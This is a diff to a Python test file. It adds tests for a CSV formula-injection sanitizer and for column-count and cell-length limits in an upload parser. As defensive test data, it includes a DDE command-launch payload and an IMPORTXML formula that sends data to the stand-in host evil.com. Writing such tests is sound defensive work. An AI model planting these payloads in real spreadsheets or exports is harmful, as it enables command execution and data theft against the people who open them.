@@ -21,9 +21,12 @@ from fastapi import HTTPException
 from shared.helpers import (
     validate_file_size,
     parse_uploaded_file,
+    sanitize_csv_value,
     ALLOWED_EXTENSIONS,
     ALLOWED_CONTENT_TYPES,
     MAX_ROW_COUNT,
+    MAX_COL_COUNT,
+    MAX_CELL_LENGTH,
 )
 from shared.error_messages import sanitize_error
 
@@ -424,3 +427,130 @@ class TestIdentifierDtypePreservation:
             acct = row.get("Account Number")
             assert isinstance(acct, str), f"Expected str, got {type(acct)}: {acct}"
             assert "." not in acct, f"Account number should not have decimal: {acct}"
+
+
+# =============================================================================
+# SPRINT 195: FORMULA INJECTION SANITIZATION (CWE-1236)
+# =============================================================================
+
+class TestSanitizeCsvValue:
+    """Tests for sanitize_csv_value — formula injection prevention."""
+
+    def test_equals_sign_escaped(self):
+        """Cell starting with = should be prefixed with single quote."""
+        assert sanitize_csv_value("=1+1") == "'=1+1"
+
+    def test_plus_sign_escaped(self):
+        """Cell starting with + should be prefixed."""
+        assert sanitize_csv_value("+cmd") == "'+cmd"
+
+    def test_minus_sign_escaped(self):
+        """Cell starting with - should be prefixed."""
+        assert sanitize_csv_value("-1") == "'-1"
+
+    def test_at_sign_escaped(self):
+        """Cell starting with @ should be prefixed."""
+        assert sanitize_csv_value("@SUM(A1)") == "'@SUM(A1)"
+
+    def test_tab_escaped(self):
+        """Cell starting with tab should be prefixed."""
+        assert sanitize_csv_value("\tcmd") == "'\tcmd"
+
+    def test_carriage_return_escaped(self):
+        """Cell starting with CR should be prefixed."""
+        assert sanitize_csv_value("\rcmd") == "'\rcmd"
+
+    def test_normal_string_unchanged(self):
+        """Normal strings should pass through unchanged."""
+        assert sanitize_csv_value("Cash and Equivalents") == "Cash and Equivalents"
+
+    def test_empty_string_unchanged(self):
+        """Empty string should pass through."""
+        assert sanitize_csv_value("") == ""
+
+    def test_none_returns_empty(self):
+        """None should return empty string."""
+        assert sanitize_csv_value(None) == ""
+
+    def test_numeric_value_converted(self):
+        """Numeric values should be stringified."""
+        assert sanitize_csv_value(12345) == "12345"
+
+    def test_negative_number_escaped(self):
+        """Negative numbers start with - so they get escaped."""
+        assert sanitize_csv_value(-500) == "'-500"
+
+    def test_formula_injection_dde(self):
+        """Classic DDE attack payload should be escaped."""
+        assert sanitize_csv_value("=cmd|'/c calc'!A1") == "'=cmd|'/c calc'!A1"
+
+    def test_formula_injection_importxml(self):
+        """IMPORTXML exfiltration payload should be escaped."""
+        payload = '=IMPORTXML("http://evil.com","//a")'
+        assert sanitize_csv_value(payload).startswith("'=")
+
+
+# =============================================================================
+# SPRINT 195: COLUMN COUNT PROTECTION
+# =============================================================================
+
+class TestColumnCountProtection:
+    """Tests for column count limit in parse_uploaded_file."""
+
+    def test_file_within_column_limit(self):
+        """Files with reasonable column count should parse normally."""
+        header = ",".join(f"col{i}" for i in range(50))
+        data = ",".join(str(i) for i in range(50))
+        content = f"{header}\n{data}\n".encode("utf-8")
+        columns, rows = parse_uploaded_file(content, "test.csv")
+        assert len(columns) == 50
+
+    def test_file_exceeding_column_limit(self):
+        """Files exceeding column limit should raise 400."""
+        # Create CSV with 1,001 columns (exceeds MAX_COL_COUNT=1000)
+        header = ",".join(f"col{i}" for i in range(1001))
+        data = ",".join("1" for _ in range(1001))
+        content = f"{header}\n{data}\n".encode("utf-8")
+        with pytest.raises(HTTPException) as exc_info:
+            parse_uploaded_file(content, "test.csv")
+        assert exc_info.value.status_code == 400
+        assert "1,001" in exc_info.value.detail
+        assert "columns" in exc_info.value.detail.lower()
+
+    def test_file_at_exact_column_limit(self):
+        """Files at exactly the column limit should parse normally."""
+        header = ",".join(f"c{i}" for i in range(MAX_COL_COUNT))
+        data = ",".join("1" for _ in range(MAX_COL_COUNT))
+        content = f"{header}\n{data}\n".encode("utf-8")
+        columns, rows = parse_uploaded_file(content, "test.csv")
+        assert len(columns) == MAX_COL_COUNT
+
+
+# =============================================================================
+# SPRINT 195: CELL CONTENT LENGTH PROTECTION
+# =============================================================================
+
+class TestCellContentLengthProtection:
+    """Tests for max cell content length in parse_uploaded_file."""
+
+    def test_normal_cell_content_accepted(self):
+        """Normal-length cell values should parse fine."""
+        content = b"name,amount\nAlice,100\n"
+        columns, rows = parse_uploaded_file(content, "test.csv")
+        assert len(rows) == 1
+
+    def test_oversized_cell_rejected(self):
+        """A cell exceeding MAX_CELL_LENGTH should raise 400."""
+        huge_value = "x" * (MAX_CELL_LENGTH + 1)
+        content = f"name,data\nAlice,{huge_value}\n".encode("utf-8")
+        with pytest.raises(HTTPException) as exc_info:
+            parse_uploaded_file(content, "test.csv")
+        assert exc_info.value.status_code == 400
+        assert "maximum length" in exc_info.value.detail.lower()
+
+    def test_cell_at_exact_limit_accepted(self):
+        """A cell at exactly MAX_CELL_LENGTH should parse fine."""
+        exact_value = "x" * MAX_CELL_LENGTH
+        content = f"name,data\nAlice,{exact_value}\n".encode("utf-8")
+        columns, rows = parse_uploaded_file(content, "test.csv")
+        assert len(rows) == 1
